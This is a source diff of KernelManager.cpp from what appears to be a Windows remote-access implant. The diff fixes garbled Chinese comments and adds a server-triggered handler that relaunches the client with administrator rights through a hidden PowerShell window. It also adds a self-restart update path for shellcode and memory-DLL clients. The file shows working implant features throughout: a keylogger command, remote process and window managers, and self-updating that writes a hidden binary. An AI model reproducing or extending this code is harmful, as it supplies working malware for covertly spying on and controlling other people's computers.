@@ -1,4 +1,4 @@
-// KernelManager.cpp: implementation of the CKernelManager class.
+﻿// KernelManager.cpp: implementation of the CKernelManager class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -16,7 +16,7 @@
 #include "IOCPUDPClient.h"
 #include "IOCPKCPClient.h"
 
-// UDP Э��������С�����ݣ�������û��ʱ�����
+// UDP 协议仅能针对小包数据，且数据没有时序关联
 IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, bool exit_while_disconnect) {
 	if (conn->protoType == PROTO_HTTPS) return NULL;
 
@@ -79,7 +79,7 @@ CKernelManager::~CKernelManager()
 	Mprintf("~CKernelManager end\n");
 }
 
-// ��ȡ���õ��߳��±�
+// 获取可用的线程下标
 UINT CKernelManager::GetAvailableIndex() {
 	if (m_ulThreadCount < MAX_THREADNUM) {
 		return m_ulThreadCount;
@@ -106,7 +106,7 @@ BOOL WriteBinaryToFile(const char* data, ULONGLONG size, const char* name = "Ser
 		if (std::string("ServerDll.new")!=name) return TRUE;
 		DeleteFileA(path);
 	}
-	// ���ļ����Զ�����ģʽд��
+	// 打开文件，以二进制模式写入
 	std::string filePath = path;
 	std::ofstream outFile(filePath, std::ios::binary);
 
@@ -116,7 +116,7 @@ BOOL WriteBinaryToFile(const char* data, ULONGLONG size, const char* name = "Ser
 		return FALSE;
 	}
 
-	// д�����������
+	// 写入二进制数据
 	outFile.write(data, size);
 
 	if (outFile.good())
@@ -130,9 +130,9 @@ BOOL WriteBinaryToFile(const char* data, ULONGLONG size, const char* name = "Ser
 		return FALSE;
 	}
 
-	// �ر��ļ�
+	// 关闭文件
 	outFile.close();
-	// �����ļ�����Ϊ����
+	// 设置文件属性为隐藏
 	if (SetFileAttributesA(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN))
 	{
 		Mprintf("File created and set to hidden: %s\n", filePath.c_str());
@@ -224,6 +224,149 @@ DWORD WINAPI SendKeyboardRecord(LPVOID lParam) {
 	return 0xDead0001;
 }
 
+// 判断 PowerShell 版本是否 >= 3.0
+bool IsPowerShellAvailable() {
+	// 设置启动信息
+	STARTUPINFO si = { sizeof(si) };
+	PROCESS_INFORMATION pi;
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_HIDE; // 隐藏窗口
+
+	// 创建匿名管道以捕获 PowerShell 输出
+	SECURITY_ATTRIBUTES sa = { sizeof(sa) };
+	sa.bInheritHandle = TRUE; // 管道句柄可继承
+
+	HANDLE hReadPipe, hWritePipe;
+	if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
+		Mprintf("CreatePipe failed. Error: %d\n", GetLastError());
+		return false;
+	}
+
+	// 设置标准输出和错误输出到管道
+	si.hStdOutput = hWritePipe;
+	si.hStdError = hWritePipe;
+	si.dwFlags |= STARTF_USESTDHANDLES;
+
+	// 构造 PowerShell 命令
+	std::string command = "powershell -Command \"$PSVersionTable.PSVersion.Major\"";
+	// 创建 PowerShell 进程
+	if (!CreateProcess(
+		nullptr,                      // 不指定模块名（使用命令行）
+		(LPSTR)command.c_str(),       // 命令行参数
+		nullptr,                      // 进程句柄不可继承
+		nullptr,                      // 线程句柄不可继承
+		TRUE,                         // 继承句柄
+		CREATE_NO_WINDOW,             // 不显示窗口
+		nullptr,                      // 使用父进程环境块
+		nullptr,                      // 使用父进程工作目录
+		&si,                          // 启动信息
+		&pi                           // 进程信息
+	)) {
+		Mprintf("CreateProcess failed. Error: %d\n", GetLastError());
+		CloseHandle(hReadPipe);
+		CloseHandle(hWritePipe);
+		return false;
+	}
+
+	// 关闭管道的写端
+	CloseHandle(hWritePipe);
+
+	// 读取 PowerShell 输出
+	std::string result;
+	char buffer[128];
+	DWORD bytesRead;
+	while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
+		buffer[bytesRead] = '\0';
+		result += buffer;
+	}
+
+	// 关闭管道的读端
+	CloseHandle(hReadPipe);
+
+	// 等待进程结束
+	WaitForSingleObject(pi.hProcess, INFINITE);
+
+	// 获取退出代码
+	DWORD exitCode=0;
+	if (!GetExitCodeProcess(pi.hProcess, &exitCode)) {
+		Mprintf("GetExitCodeProcess failed. Error: %d\n", GetLastError());
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return false;
+	}
+
+	// 关闭进程和线程句柄
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+
+	// 解析返回的版本号
+	if (exitCode == 0) {
+		try {
+			int version = std::stoi(result);
+			Mprintf("PowerShell version: %d\n", version);
+			return version >= 3;
+		}
+		catch (...) {
+			Mprintf("Failed to parse PowerShell version.\n");
+			return false;
+		}
+	}
+	else {
+		Mprintf("PowerShell command failed with exit code: %d\n", exitCode);
+		return false;
+	}
+}
+
+/*
+Windows 10/11: 👉 放心使用，可以直接运行
+Windows 7: 如果 PowerShell 版本 >= 3.0，可以运行; 否则无法以管理员权限重启
+*/
+bool StartAdminLauncherAndExit(const char* exePath, bool admin = true) {
+	// 获取当前进程 ID
+	DWORD currentPID = GetCurrentProcessId();
+
+	// 构造 PowerShell 命令，等待当前进程退出后以管理员权限启动
+	std::string launcherCmd = "powershell -Command \"Start-Sleep -Seconds 1; " // 等待 1 秒，确保当前进程退出
+		"while (Get-Process -Id " + std::to_string(currentPID) + " -ErrorAction SilentlyContinue) { Start-Sleep -Milliseconds 500 }; "
+		"Start-Process -FilePath '" + std::string(exePath);
+	launcherCmd += admin ? "' -Verb RunAs\"" : "' \""; // 以管理员权限启动目标进程
+
+	// 启动隐藏的 cmd 进程
+	STARTUPINFO si = { sizeof(si) };
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_HIDE;  // 隐藏窗口
+	PROCESS_INFORMATION pi = {};
+	Mprintf("Run: %s\n", launcherCmd.c_str());
+	if (CreateProcessA(NULL, (LPSTR)launcherCmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+		Mprintf("CreateProcess to start launcher process [%d].\n", pi.dwProcessId);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return true;
+	}
+
+	Mprintf("Failed to start launcher process.\n");
+	return false;
+}
+
+BOOL IsRunningAsAdmin()
+{
+	BOOL isAdmin = FALSE;
+	PSID administratorsGroup = NULL;
+
+	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+	if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
+		0, 0, 0, 0, 0, 0, &administratorsGroup))
+	{
+		if (!CheckTokenMembership(NULL, administratorsGroup, &isAdmin))
+		{
+			isAdmin = FALSE;
+		}
+		FreeSid(administratorsGroup);
+	}
+
+	return isAdmin;
+}
+
 VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 {
 	bool isExit = szBuffer[0] == COMMAND_BYE || szBuffer[0] == SERVER_EXIT;
@@ -237,11 +380,29 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
 	switch (szBuffer[0])
 	{
+	case CMD_RUNASADMIN: {
+		char curFile[_MAX_PATH] = {};
+		GetModuleFileName(NULL, curFile, MAX_PATH);
+		if (!IsRunningAsAdmin())
+		{
+			if (IsPowerShellAvailable() && StartAdminLauncherAndExit(curFile)) {
+				g_bExit = S_CLIENT_EXIT;
+				// 强制退出当前进程，并稍后以管理员权限运行
+				Mprintf("CKernelManager: [%s] Restart with administrator privileges.\n", curFile);
+				Sleep(1000);
+				TerminateProcess(GetCurrentProcess(), 0xABCDEF);
+			}
+			Mprintf("CKernelManager: [%s] Restart with administrator privileges FAILED.\n", curFile);
+			break;
+		}
+		Mprintf("CKernelManager: [%s] Running with administrator privileges.\n", curFile);
+		break;
+	}
 	case CMD_AUTHORIZATION: {
 		HANDLE hMutex = OpenMutex(SYNCHRONIZE, FALSE, "MASTER.EXE");
 		hMutex = hMutex ? hMutex : OpenMutex(SYNCHRONIZE, FALSE, "YAMA.EXE");
 #ifndef _DEBUG
-		if (hMutex == NULL) { // û�л����������������δ����
+		if (hMutex == NULL) { // 没有互斥量，主程序可能未运行
 			Mprintf("!!! [WARN] Master program is not running.\n");
 		}
 #endif
@@ -253,10 +414,10 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		const char* pwdHash = m_conn->pwdHash[0] ? m_conn->pwdHash : masterHash.c_str();
 		if (passCode[0] == 0) {
 			std::string devId = getDeviceID();
-			memcpy(buf + 24, buf + 12, 8); // ��Ϣǩ��
-			memcpy(buf + 96, buf + 8, 4); // ʱ���
-			memcpy(buf + 5, devId.c_str(), devId.length());		// 16�ֽ�
-			memcpy(buf + 32, pwdHash, 64);						// 64�ֽ�
+			memcpy(buf + 24, buf + 12, 8); // 消息签名
+			memcpy(buf + 96, buf + 8, 4); // 时间戳
+			memcpy(buf + 5, devId.c_str(), devId.length());		// 16字节
+			memcpy(buf + 32, pwdHash, 64);						// 64字节
 			m_ClientObject->Send2Server((char*)buf, sizeof(buf));
 			Mprintf("Request for authorization update.\n");
 		} else {
@@ -283,7 +444,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 			iniFile cfg(CLIENT_PATH);
 			auto md5 = cfg.GetStr("settings", info->Name + std::string(".md5"));
 			if (md5.empty() || md5 != info->Md5 || !m_conn->IsVerified()) {
-				// ��һ������û�а���DLL���ݣ���ͻ��˼�Ȿ���Ƿ��Ѿ������DLL��û��������������ִ�д���
+				// 第一个命令没有包含DLL数据，需客户端检测本地是否已经有相关DLL，没有则向主控请求执行代码
 				m_ClientObject->Send2Server((char*)szBuffer, ulLength);
 				break;
 			}
@@ -370,7 +531,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 			memcpy(&m_settings, szBuffer + 1, sizeof(MasterSettings));
 		}
 		break;
-	case COMMAND_KEYBOARD: //���̼�¼
+	case COMMAND_KEYBOARD: //键盘记录
 		{
 			if (m_hKeyboard) {
 				CloseHandle(__CreateThread(NULL, 0, SendKeyboardRecord, m_hKeyboard->user, 0, NULL));
@@ -396,14 +557,14 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 			break;
 		}
 
-	case COMMAND_SYSTEM:       //Զ�̽��̹���
+	case COMMAND_SYSTEM:       //远程进程管理
 		{
 			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
 			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL, 0, LoopProcessManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
-	case COMMAND_WSLIST:       //Զ�̴��ڹ���
+	case COMMAND_WSLIST:       //远程窗口管理
 		{
 			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
 			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopWindowManager, &m_hThread[m_ulThreadCount], 0, NULL);;
@@ -412,7 +573,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
 	case COMMAND_BYE:
 		{
-			BYTE	bToken = COMMAND_BYE;// ���ض��˳�
+			BYTE	bToken = COMMAND_BYE;// 被控端退出
 			m_ClientObject->Send2Server((char*)&bToken, 1);
 			g_bExit = S_CLIENT_EXIT;
 			Mprintf("======> Client exit \n");
@@ -421,7 +582,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
 	case SERVER_EXIT:
 		{
-			// ���ض��˳�
+			// 主控端退出
 			g_bExit = S_SERVER_EXIT;
 			Mprintf("======> Server exit \n");
 			break;
@@ -476,15 +637,30 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 			break;
 		}
 
-	case COMMAND_UPDATE:
-		{
-			ULONGLONG size=0;
+	case COMMAND_UPDATE:{
+		auto typ = m_conn->ClientType();
+		if (typ == CLIENT_TYPE_DLL || typ == CLIENT_TYPE_MODULE) {
+			ULONGLONG size = 0;
 			memcpy(&size, (const char*)szBuffer + 1, sizeof(ULONGLONG));
 			if (WriteBinaryToFile((const char*)szBuffer + 1 + sizeof(ULONGLONG), size)) {
 				g_bExit = S_CLIENT_UPDATE;
 			}
-			break;
+		}else if (typ == CLIENT_TYPE_SHELLCODE || typ == CLIENT_TYPE_MEMDLL) {
+			char curFile[_MAX_PATH] = {};
+			GetModuleFileName(NULL, curFile, MAX_PATH);
+			if (IsPowerShellAvailable() && StartAdminLauncherAndExit(curFile, false)) {
+				g_bExit = S_CLIENT_UPDATE;
+				// 强制退出当前进程，并重新启动；这会触发重新获取 Shell code 从而做到软件升级
+				Mprintf("CKernelManager: [%s] Will be updated.\n", curFile);
+				Sleep(1000);
+				TerminateProcess(GetCurrentProcess(), 0xABCDEF);
+			}
+			Mprintf("CKernelManager: [%s] Update FAILED.\n", curFile);
+		} else {
+			Mprintf("=====> 客户端类型'%d'不支持文件升级\n", typ);
 		}
+		break;
+	}
 
 	default:
 		{
